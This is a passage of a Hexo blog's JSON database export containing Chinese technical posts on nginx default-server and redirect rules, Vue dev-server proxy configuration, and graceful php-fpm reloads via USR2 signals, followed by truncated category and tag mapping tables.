class=\"line\">    listen 80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    return 501;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通过301跳转主页</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 80 default_server;</span><br><span class=\"line\">    server_name _;</span><br><span class=\"line\">    rewrite ^(.*) http://blog.dns.com/$1 permanent;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if ($host !~ ^www/.tag/.com$) &#123;</span><br><span class=\"line\">    rewrite ^(.*) http://blog.mydns.vip$1 permanent;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"vue配置跨域代理","abbrlink":42883,"_content":"\n### 前言\n\n如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。\n\n<!--more-->\n\n### vue.config.js\n\n`vue.config.js` 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。\n\n这个文件应该导出一个包含了选项的对象\n\n```js\n// vue.config.js\nmodule.exports = {\n  // 选项...\n}\n```\n\n### devServer.proxy\n\ndevServer.proxy 可以是一个指向开发环境 API 服务器的字符串：\n\n```js\nmodule.exports = {\n  devServer: {\n    proxy: 'http://localhost:4000'\n  }\n}\n```\n\n这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到http://localhost:4000。\n\n```js\nmodule.exports = {\n  devServer: {\n    proxy: {\n      '/api': {\n        target: '<url>',\n        ws: true,\n        changeOrigin: true\n        pathRewrite: {\n            '^/api': ''\n        }\n      },\n      '/foo': {\n        target: '<other_url>'\n      }\n    }\n  }\n}\n```\n\n更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 [http-proxy-middleware](https://github.com/chimurai/http-proxy-middleware#proxycontext-config) 。\n\n### 总结\n\n以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决\n","source":"_posts/2020/4/vue配置跨域代理.md","raw":"---\nlayout: post\ntitle: vue配置跨域代理\ntags:\n  - vue\ncategories:\n  - vue\nabbrlink: 42883\n---\n\n### 前言\n\n如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。\n\n<!--more-->\n\n### vue.config.js\n\n`vue.config.js` 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。\n\n这个文件应该导出一个包含了选项的对象\n\n```js\n// vue.config.js\nmodule.exports = {\n  // 选项...\n}\n```\n\n### devServer.proxy\n\ndevServer.proxy 可以是一个指向开发环境 API 服务器的字符串：\n\n```js\nmodule.exports = {\n  devServer: {\n    proxy: 'http://localhost:4000'\n  }\n}\n```\n\n这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到http://localhost:4000。\n\n```js\nmodule.exports = {\n  devServer: {\n    proxy: {\n      '/api': {\n        target: '<url>',\n        ws: true,\n        changeOrigin: true\n        pathRewrite: {\n            '^/api': ''\n        }\n      },\n      '/foo': {\n        target: '<other_url>'\n      }\n    }\n  }\n}\n```\n\n更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 [http-proxy-middleware](https://github.com/chimurai/http-proxy-middleware#proxycontext-config) 。\n\n### 总结\n\n以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决\n","slug":"2020/4/vue配置跨域代理","published":1,"date":"2020-04-21T13:49:03.004Z","updated":"2020-04-21T13:54:56.506Z","comments":1,"photos":[],"link":"","_id":"ck9z76w06002r44vqrrtsrv4w","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。</p>\n<a id=\"more\"></a>\n<h3 id=\"vue-config-js\"><a href=\"#vue-config-js\" class=\"headerlink\" title=\"vue.config.js\"></a>vue.config.js</h3><p><code>vue.config.js</code> 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。</p>\n<p>这个文件应该导出一个包含了选项的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// vue.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 选项...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"devServer-proxy\"><a href=\"#devServer-proxy\" class=\"headerlink\" title=\"devServer.proxy\"></a>devServer.proxy</h3><p>devServer.proxy 可以是一个指向开发环境 API 服务器的字符串：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    proxy: <span class=\"string\">'http://localhost:4000'</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到<a href=\"http://localhost:4000。\" target=\"_blank\" rel=\"noopener\">http://localhost:4000。</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    proxy: &#123;</span><br><span class=\"line\">      <span class=\"string\">'/api'</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">'&lt;url&gt;'</span>,</span><br><span class=\"line\">        ws: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        changeOrigin: <span class=\"literal\">true</span></span><br><span class=\"line\">        pathRewrite: &#123;</span><br><span class=\"line\">            <span class=\"string\">'^/api'</span>: <span class=\"string\">''</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"string\">'/foo'</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">'&lt;other_url&gt;'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 <a href=\"https://github.com/chimurai/http-proxy-middleware#proxycontext-config\" target=\"_blank\" rel=\"noopener\">http-proxy-middleware</a> 。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决</p>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。</p>","more":"<h3 id=\"vue-config-js\"><a href=\"#vue-config-js\" class=\"headerlink\" title=\"vue.config.js\"></a>vue.config.js</h3><p><code>vue.config.js</code> 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。</p>\n<p>这个文件应该导出一个包含了选项的对象</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// vue.config.js</span></span><br><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  <span class=\"comment\">// 选项...</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"devServer-proxy\"><a href=\"#devServer-proxy\" class=\"headerlink\" title=\"devServer.proxy\"></a>devServer.proxy</h3><p>devServer.proxy 可以是一个指向开发环境 API 服务器的字符串：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    proxy: <span class=\"string\">'http://localhost:4000'</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到<a href=\"http://localhost:4000。\" target=\"_blank\" rel=\"noopener\">http://localhost:4000。</a></p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">module</span>.exports = &#123;</span><br><span class=\"line\">  devServer: &#123;</span><br><span class=\"line\">    proxy: &#123;</span><br><span class=\"line\">      <span class=\"string\">'/api'</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">'&lt;url&gt;'</span>,</span><br><span class=\"line\">        ws: <span class=\"literal\">true</span>,</span><br><span class=\"line\">        changeOrigin: <span class=\"literal\">true</span></span><br><span class=\"line\">        pathRewrite: &#123;</span><br><span class=\"line\">            <span class=\"string\">'^/api'</span>: <span class=\"string\">''</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;,</span><br><span class=\"line\">      <span class=\"string\">'/foo'</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">'&lt;other_url&gt;'</span></span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 <a href=\"https://github.com/chimurai/http-proxy-middleware#proxycontext-config\" target=\"_blank\" rel=\"noopener\">http-proxy-middleware</a> 。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决</p>"},{"layout":"post","title":"平滑重启php-fpm","abbrlink":52587,"_content":"\n### 前言\n\nphp-fpm 会对下面几个信号作（自己的）处理\n\n- SIGINT, SIGTERM: immediate termination\n- SIGQUIT: graceful stop\n- SIGUSR1: re-open log file\n- SIGUSR2: graceful reload of all workers + reload of fpm conf/binary\n\n<!--more-->\n\n### 理解\n\nmaster进程可以理解以下信号\n\n- INT （2）, TERM（15） 立刻终止\n- QUIT （3） 平滑终止\n- USR1 重新打开日志文件\n- USR2 平滑重载所有worker进程并重新载入配置和二进制模块\n\n#### 查看进程数\n\n```bash\nps aux | grep -c php-fpm\n```\n\n#### 查看master进程号\n\n```bash\nps aux|grep 'php-fpm: master' | awk '{print $2}'\n```\n\n#### 平滑重启\n\n```bash\nkill -USR2 `cat /usr/local/php/var/run/php-fpm.pid`\n```\nOR\n```bash\nkill -USR2 [pid]\n```\n\n### 脚本实现\n\n#### centos脚本实现\n\n```bash\n#!/bin/bash\necho \"php-fpm is reloading....\"\nPID=`ps aux | grep php-fpm | grep \"master\" |awk '{print $2}'`\n\n[ $PID ] && kill -USR2 $PID || echo \"php-fpm is useing(pid=$PID)\"\necho \"reload done!\"\necho \"php-fpm is reload...\"\necho \"reload done!\"\n```\n","source":"_posts/2020/4/平滑重启php-fpm.md","raw":"---\nlayout: post\ntitle: 平滑重启php-fpm\ntags:\n  - php\ncategories:\n  - php\nabbrlink: 52587\n---\n\n### 前言\n\nphp-fpm 会对下面几个信号作（自己的）处理\n\n- SIGINT, SIGTERM: immediate termination\n- SIGQUIT: graceful stop\n- SIGUSR1: re-open log file\n- SIGUSR2: graceful reload of all workers + reload of fpm conf/binary\n\n<!--more-->\n\n### 理解\n\nmaster进程可以理解以下信号\n\n- INT （2）, TERM（15） 立刻终止\n- QUIT （3） 平滑终止\n- USR1 重新打开日志文件\n- USR2 平滑重载所有worker进程并重新载入配置和二进制模块\n\n#### 查看进程数\n\n```bash\nps aux | grep -c php-fpm\n```\n\n#### 查看master进程号\n\n```bash\nps aux|grep 'php-fpm: master' | awk '{print $2}'\n```\n\n#### 平滑重启\n\n```bash\nkill -USR2 `cat /usr/local/php/var/run/php-fpm.pid`\n```\nOR\n```bash\nkill -USR2 [pid]\n```\n\n### 脚本实现\n\n#### centos脚本实现\n\n```bash\n#!/bin/bash\necho \"php-fpm is reloading....\"\nPID=`ps aux | grep php-fpm | grep \"master\" |awk '{print $2}'`\n\n[ $PID ] && kill -USR2 $PID || echo \"php-fpm is useing(pid=$PID)\"\necho \"reload done!\"\necho \"php-fpm is reload...\"\necho \"reload done!\"\n```\n","slug":"2020/4/平滑重启php-fpm","published":1,"date":"2020-04-06T07:22:29.624Z","updated":"2020-04-12T06:34:43.631Z","comments":1,"photos":[],"link":"","_id":"ck9z76w0v004044vqvf8x6wlg","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>php-fpm 会对下面几个信号作（自己的）处理</p>\n<ul>\n<li>SIGINT, SIGTERM: immediate termination</li>\n<li>SIGQUIT: graceful stop</li>\n<li>SIGUSR1: re-open log file</li>\n<li>SIGUSR2: graceful reload of all workers + reload of fpm conf/binary</li>\n</ul>\n<a id=\"more\"></a>\n<h3 id=\"理解\"><a href=\"#理解\" class=\"headerlink\" title=\"理解\"></a>理解</h3><p>master进程可以理解以下信号</p>\n<ul>\n<li>INT （2）, TERM（15） 立刻终止</li>\n<li>QUIT （3） 平滑终止</li>\n<li>USR1 重新打开日志文件</li>\n<li>USR2 平滑重载所有worker进程并重新载入配置和二进制模块</li>\n</ul>\n<h4 id=\"查看进程数\"><a href=\"#查看进程数\" class=\"headerlink\" title=\"查看进程数\"></a>查看进程数</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep -c php-fpm</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看master进程号\"><a href=\"#查看master进程号\" class=\"headerlink\" title=\"查看master进程号\"></a>查看master进程号</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux|grep <span class=\"string\">'php-fpm: master'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"平滑重启\"><a href=\"#平滑重启\" class=\"headerlink\" title=\"平滑重启\"></a>平滑重启</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">kill</span> -USR2 `cat /usr/<span class=\"built_in\">local</span>/php/var/run/php-fpm.pid`</span><br></pre></td></tr></table></figure>\n<p>OR<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">kill</span> -USR2 [pid]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"脚本实现\"><a href=\"#脚本实现\" class=\"headerlink\" title=\"脚本实现\"></a>脚本实现</h3><h4 id=\"centos脚本实现\"><a href=\"#centos脚本实现\" class=\"headerlink\" title=\"centos脚本实现\"></a>centos脚本实现</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is reloading....\"</span></span><br><span class=\"line\">PID=`ps aux | grep php-fpm | grep <span class=\"string\">\"master\"</span> |awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"></span><br><span class=\"line\">[ <span class=\"variable\">$PID</span> ] &amp;&amp; <span class=\"built_in\">kill</span> -USR2 <span class=\"variable\">$PID</span> || <span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is useing(pid=<span class=\"variable\">$PID</span>)\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"reload done!\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is reload...\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"reload done!\"</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>php-fpm 会对下面几个信号作（自己的）处理</p>\n<ul>\n<li>SIGINT, SIGTERM: immediate termination</li>\n<li>SIGQUIT: graceful stop</li>\n<li>SIGUSR1: re-open log file</li>\n<li>SIGUSR2: graceful reload of all workers + reload of fpm conf/binary</li>\n</ul>","more":"<h3 id=\"理解\"><a href=\"#理解\" class=\"headerlink\" title=\"理解\"></a>理解</h3><p>master进程可以理解以下信号</p>\n<ul>\n<li>INT （2）, TERM（15） 立刻终止</li>\n<li>QUIT （3） 平滑终止</li>\n<li>USR1 重新打开日志文件</li>\n<li>USR2 平滑重载所有worker进程并重新载入配置和二进制模块</li>\n</ul>\n<h4 id=\"查看进程数\"><a href=\"#查看进程数\" class=\"headerlink\" title=\"查看进程数\"></a>查看进程数</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux | grep -c php-fpm</span><br></pre></td></tr></table></figure>\n<h4 id=\"查看master进程号\"><a href=\"#查看master进程号\" class=\"headerlink\" title=\"查看master进程号\"></a>查看master进程号</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps aux|grep <span class=\"string\">'php-fpm: master'</span> | awk <span class=\"string\">'&#123;print $2&#125;'</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"平滑重启\"><a href=\"#平滑重启\" class=\"headerlink\" title=\"平滑重启\"></a>平滑重启</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">kill</span> -USR2 `cat /usr/<span class=\"built_in\">local</span>/php/var/run/php-fpm.pid`</span><br></pre></td></tr></table></figure>\n<p>OR<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">kill</span> -USR2 [pid]</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"脚本实现\"><a href=\"#脚本实现\" class=\"headerlink\" title=\"脚本实现\"></a>脚本实现</h3><h4 id=\"centos脚本实现\"><a href=\"#centos脚本实现\" class=\"headerlink\" title=\"centos脚本实现\"></a>centos脚本实现</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is reloading....\"</span></span><br><span class=\"line\">PID=`ps aux | grep php-fpm | grep <span class=\"string\">\"master\"</span> |awk <span class=\"string\">'&#123;print $2&#125;'</span>`</span><br><span class=\"line\"></span><br><span class=\"line\">[ <span class=\"variable\">$PID</span> ] &amp;&amp; <span class=\"built_in\">kill</span> -USR2 <span class=\"variable\">$PID</span> || <span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is useing(pid=<span class=\"variable\">$PID</span>)\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"reload done!\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"php-fpm is reload...\"</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"reload done!\"</span></span><br></pre></td></tr></table></figure>"}],"PostAsset":[],"PostCategory":[{"post_id":"ck9z76vz6000444vqo59t1l20","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76vzi000h44vqqd4lxao7"},{"post_id":"ck9z76vzg000e44vqgvkg37g4","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76vzl000n44vqrqc8jwbh"},{"post_id":"ck9z76vz8000544vqwlsj0mkl","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76vzm000r44vq3ba4l2u3"},{"post_id":"ck9z76vzb000844vq64v48ly5","category_id":"ck9z76vzi000g44vq2m6p9whk","_id":"ck9z76vzn000v44vq8f5r1u7m"},{"post_id":"ck9z76vzd000944vqw6zs7e1n","category_id":"ck9z76vzi000g44vq2m6p9whk","_id":"ck9z76vzp001144vq2z1vpm1x"},{"post_id":"ck9z76vzm000t44vqkrls8n4p","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76vzq001544vqhzp7cz5r"},{"post_id":"ck9z76vze000a44vqtcu2xjd5","category_id":"ck9z76vzn000u44vqfacoec1k","_id":"ck9z76vzr001844vq7q228y9a"},{"post_id":"ck9z76vzp001444vqwdzgy6be","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzs001d44vqr0q0u19u"},{"post_id":"ck9z76vzh000f44vqtvp79fno","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzt001g44vqp2cdb7do"},{"post_id":"ck9z76vzr001b44vqbdqhut86","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzu001k44vq0hx4g94f"},{"post_id":"ck9z76vzj000k44vqusqcs9l7","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzv001o44vqu1fabuiu"},{"post_id":"ck9z76vzt001f44vqkq0irgh3","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzx001s44vqzcph3hz8"},{"post_id":"ck9z76vzk000m44vqdjzn118e","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76vzy001w44vqkln8qwlx"},{"post_id":"ck9z76vzu001j44vqf9cpgeb3","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76vzz002044vqq2jilbp2"},{"post_id":"ck9z76vzm000q44vqwuvqma1e","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76w00002444vqmp8jb7gl"},{"post_id":"ck9z76vzn000x44vqeoant4q1","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76w02002944vqrguyjkd9"},{"post_id":"ck9z76vzo000z44vqnmxvfqu5","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76w03002f44vq98yd4amo"},{"post_id":"ck9z76w01002744vqwws5i1oy","category_id":"ck9z76vza000644vqaxbjlhxi","_id":"ck9z76w04002j44vqou3vdslp"},{"post_id":"ck9z76w03002d44vq4gk21oxh","category_id":"ck9z76w01002844vqin8irte5","_id":"ck9z76w06002n44vqrmrrqlxg"},{"post_id":"ck9z76vzq001744vql9tpfnx9","category_id":"ck9z76w01002844vqin8irte5","_id":"ck9z76w07002s44vq04bu3ibv"},{"post_id":"ck9z76w04002l44vqr6uxmbxj","category_id":"ck9z76vzn000u44vqfacoec1k","_id":"ck9z76w07002u44vqoovgrxwo"},{"post_id":"ck9z76vzs001c44vqsbtidmam","category_id":"ck9z76w04002h44vqcpo0cx33","_id":"ck9z76w08002y44vqzqzw87y8"},{"post_id":"ck9z76w06002r44vqrrtsrv4w","category_id":"ck9z76vzi000g44vq2m6p9whk","_id":"ck9z76w08003044vqnzhyjh5h"},{"post_id":"ck9z76vzv001n44vq9idusgsm","category_id":"ck9z76w01002844vqin8irte5","_id":"ck9z76w09003344vqzlhk9by4"},{"post_id":"ck9z76vzw001r44vqyov2iu83","category_id":"ck9z76w07002v44vq6n09cx5w","_id":"ck9z76w09003644vq81xcsfr4"},{"post_id":"ck9z76vzx001v44vq9tsv1ghg","category_id":"ck9z76w04002h44vqcpo0cx33","_id":"ck9z76w0a003a44vqj80icb95"},{"post_id":"ck9z76vzy001z44vqmykcgqgw","category_id":"ck9z76w04002h44vqcpo0cx33","_id":"ck9z76w0a003e44vq1a2imw3u"},{"post_id":"ck9z76w00002344vqsn7cg7nb","category_id":"ck9z76w04002h44vqcpo0cx33","_id":"ck9z76w0b003i44vqzplm9t3p"},{"post_id":"ck9z76w02002a44vq2iky78wx","category_id":"ck9z76w04002h44vqcpo0cx33","_id":"ck9z76w0b003l44vqpgl5js10"},{"post_id":"ck9z76w03002g44vqj2isbbm7","category_id":"ck9z76w0b003h44vqiwztdkgo","_id":"ck9z76w0c003p44vqnw8pg6hg"},{"post_id":"ck9z76w05002m44vq2bn6hp33","category_id":"ck9z76w0b003m44vq5tb30mgh","_id":"ck9z76w0d003s44vql1m3wr2v"},{"post_id":"ck9z76w0v004044vqvf8x6wlg","category_id":"ck9z76vzp001244vqz0jzl57i","_id":"ck9z76w0w004244vqz4nufq8r"}],"PostTag":[{"post_id":"ck9z76vz6000444vqo59t1l20","tag_id":"ck9z76vzb000744vq1nc8gwos","_id":"ck9z76vzg000d44vqnlf0hrm7"},{"post_id":"ck9z76vzg000e44vqgvkg37g4","tag_id":"ck9z76vzb000744vq1nc8gwos","_id":"ck9z76vzi000j44vq3rhie91i"},{"post_id":"ck9z76vz8000544vqwlsj0mkl","tag_id":"ck9z76vzb000744vq1nc8gwos","_id":"ck9z76vzk000l44vqhjtxb09x"},{"post_id":"ck9z76vzb000844vq64v48ly5","tag_id":"ck9z76vzi000i44vqf1k0iidb","_id":"ck9z76vzm000s44vq3ivorfbl"},{"post_id":"ck9z76vzd000944vqw6zs7e1n","tag_id":"ck9z76vzi000i44vqf1k0iidb","_id":"ck9z76vzo000y44vq1nwzmg8d"},{"post_id":"ck9z76vzm000t44vqkrls8n4p","tag_id":"ck9z76vzb000744vq1nc8gwos","_id":"ck9z76vzp001044vqb5nyrf01"},{"post_id":"ck9z76vze000a44vqtcu2xjd5","tag_id":"ck9z76vzn000w44vqxmj5ljju","_id":"ck9z76vzq001644vqm1kodzo2"},{"post_id":"ck9z76vzh000f44vqtvp79fno","tag_id":"ck9z76vzp001344vqjxakn659","_id":"ck9z76vzu001i44vqcqqsysed"},{"post_id":"ck9z76vzh000f44vqtvp79fno","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76vzv001m44vqy3mcjgmr"},{"post_id":"ck9z76vzt001f44vqkq0irgh3","tag_id":"ck9z76vzr001a44vqcpqvyaj6","_id":"ck9z76vzw001q44vq82ambns6"},{"post_id":"ck9z76vzj000k44vqusqcs9l7","tag_id":"ck9z76vzr001a4